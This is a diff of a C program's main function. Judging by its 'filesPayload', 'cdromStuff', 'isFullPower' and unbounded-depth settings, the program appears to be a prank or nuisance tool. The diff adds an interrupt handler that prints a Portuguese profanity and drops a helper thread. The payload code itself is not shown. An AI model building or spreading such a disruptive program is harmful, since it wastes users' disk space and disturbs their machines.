@@ -3,13 +3,16 @@
 #include "Includes/preprocessor.h"
 extern int maxLevel,
 	isFullPower;
-extern float sleepSecs,
-		minSleepSecs;
+
+extern float sleepSecs;
+
 char* rootDir;
-int go=1;
+int go=1,quit=0;
 void intHandler(int useless){
-
-
+       if(!isFullPower){
+	printf("BORAEMBORA CARALHO!! ANDOR!!!!\n");
+	quit=1;
+	}
 
 }
 
@@ -52,23 +55,23 @@ int main(int argc, char ** argv){
 		maxLevel=atoi(argv[1]);
 		
 		sleepSecs=atof(argv[2]);
-		if(sleepSecs<minSleepSecs){
+		if(sleepSecs<MIN_SLEEP_SECS){
 			
-			sleepSecs=minSleepSecs;
+			sleepSecs=MIN_SLEEP_SECS;
 
 		}
 	}
 	}
 	if(isFullPower){
 		maxLevel=INT_MAX;
-		sleepSecs= minSleepSecs;
+		sleepSecs= MIN_SLEEP_SECS;
 	}
 		
-		
+		signal(SIGINT,intHandler);
 		rootDir=EGG_DIR_PATH(INITDIR);
-		pthread_t filesWorker,semaphore, output,cdromStuff;
+		pthread_t filesWorker, output,cdromStuff;
 
-	
+		
 		
 		int pid=fork();
 			switch(pid){
@@ -103,11 +106,10 @@ int main(int argc, char ** argv){
 				break;
 				default:
 						pthread_create(&filesWorker,NULL,filesPayload,NULL);
-						pthread_create(&semaphore,NULL,dirCheckerHelper,NULL);
-						pthread_join(semaphore,NULL);
 						pthread_join(filesWorker,NULL);
 					break;
 
 			}
+			free(rootDir);
 }
 
